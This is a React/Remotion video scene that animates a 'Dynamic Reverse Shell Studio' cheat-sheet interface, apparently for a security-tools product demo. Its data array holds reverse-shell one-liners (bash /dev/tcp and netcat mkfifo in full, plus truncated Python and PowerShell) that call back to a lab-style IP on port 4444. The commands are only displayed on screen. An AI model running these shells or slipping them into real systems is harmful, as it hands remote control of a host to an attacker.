import React from "react";
import {
  AbsoluteFill,
  useCurrentFrame,
  useVideoConfig,
  spring,
  interpolate,
} from "remotion";
import { Check } from "lucide-react";
import { RadiantBackground } from "../components-saas/RadiantBackground";
import { MacOSWindow } from "../components-saas/MacOSWindow";

export const Scene4_PayloadStudio: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  // Copy trigger at frame 50
  const isCopied = frame >= 50;
  const toastSpring = spring({
    frame: frame - 50,
    fps,
    config: { damping: 14, stiffness: 100 },
  });

  const sceneOpacity = interpolate(frame, [135, 150], [1, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  const shells = [
    { name: "Bash -i Interactive", cmd: "sh -i >& /dev/tcp/10.10.14.33/4444 0>&1", lang: "bash" },
    { name: "Python3 PTY", cmd: "python3 -c 'import os,pty,socket;s=socket.socket()...'", lang: "python" },
    { name: "Netcat Traditional", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.33 4444 >/tmp/f", lang: "shell" },
    { name: "PowerShell Base64", cmd: "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.33',4444)...", lang: "powershell" },
  ];

  return (
    <RadiantBackground>
      <AbsoluteFill
        style={{
          opacity: sceneOpacity,
          padding: "50px 80px",
          display: "flex",
          flexDirection: "column",
          gap: 24,
        }}
      >
        {/* Header */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end" }}>
          <div>
            <div
              style={{
                fontSize: 13,
                fontWeight: 600,
                color: "#38BDF8",
                fontFamily: "Inter, sans-serif",
                letterSpacing: "0.08em",
                marginBottom: 6,
              }}
            >
              MODULE 03 // CHEATSHEETS & PAYLOADS
            </div>
            <h2
              style={{
                fontSize: 42,
                fontWeight: 800,
                fontFamily: "Inter, -apple-system, sans-serif",
                color: "#F8FAFC",
                letterSpacing: "-0.02em",
                margin: 0,
              }}
            >
              Dynamic Reverse Shell Studio
            </h2>
          </div>

          {/* Sticky IP/Port controls */}
          <div style={{ display: "flex", gap: 12 }}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                backgroundColor: "rgba(255, 255, 255, 0.06)",
                border: "1px solid rgba(255, 255, 255, 0.12)",
                padding: "8px 16px",
                borderRadius: 12,
                fontFamily: "'JetBrains Mono', monospace",
                fontSize: 13,
                color: "#F8FAFC",
              }}
            >
              <span style={{ color: "#94A3B8" }}>LHOST:</span>
              <span style={{ color: "#38BDF8", fontWeight: 700 }}>10.10.14.33</span>
            </div>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                backgroundColor: "rgba(255, 255, 255, 0.06)",
                border: "1px solid rgba(255, 255, 255, 0.12)",
                padding: "8px 16px",
                borderRadius: 12,
                fontFamily: "'JetBrains Mono', monospace",
                fontSize: 13,
                color: "#F8FAFC",
              }}
            >
              <span style={{ color: "#94A3B8" }}>LPORT:</span>
              <span style={{ color: "#34D399", fontWeight: 700 }}>4444</span>
            </div>
          </div>
        </div>

        {/* Browser Mockup */}
        <MacOSWindow style={{ flex: 1, padding: "28px 36px", position: "relative" }}>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
            {shells.map((s, idx) => {
              const isSelected = idx === 0;
              return (
                <div
                  key={s.name}
                  style={{
                    backgroundColor: isSelected ? "rgba(56, 189, 248, 0.06)" : "rgba(255, 255, 255, 0.02)",
                    border: `1px solid ${isSelected ? "rgba(56, 189, 248, 0.3)" : "rgba(255, 255, 255, 0.06)"}`,
                    borderRadius: 14,
                    padding: "18px 20px",
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "space-between",
                    gap: 12,
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "#F8FAFC", fontFamily: "Inter, sans-serif" }}>
                      {s.name}
                    </span>
                    <span style={{ fontSize: 11, color: "#94A3B8", textTransform: "uppercase" }}>{s.lang}</span>
                  </div>

                  <div
                    style={{
                      backgroundColor: "rgba(0, 0, 0, 0.35)",
                      padding: "10px 14px",
                      borderRadius: 10,
                      fontFamily: "'JetBrains Mono', monospace",
                      fontSize: 12,
                      color: isSelected ? "#38BDF8" : "#94A3B8",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {s.cmd}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Toast Notification */}
          {isCopied && (
            <div
              style={{
                position: "absolute",
                bottom: 24,
                left: "50%",
                transform: `translateX(-50%) translateY(${(1 - toastSpring) * 30}px)`,
                opacity: toastSpring,
                backgroundColor: "#10B981",
                color: "#FFFFFF",
                padding: "10px 24px",
                borderRadius: 30,
                boxShadow: "0 15px 35px -5px rgba(16, 185, 129, 0.5)",
                display: "flex",
                alignItems: "center",
                gap: 8,
                fontFamily: "Inter, sans-serif",
                fontSize: 13,
                fontWeight: 600,
              }}
            >
              <Check size={16} />
              <span>Payload copied to clipboard</span>
            </div>
          )}
        </MacOSWindow>
      </AbsoluteFill>
    </RadiantBackground>
  );
};
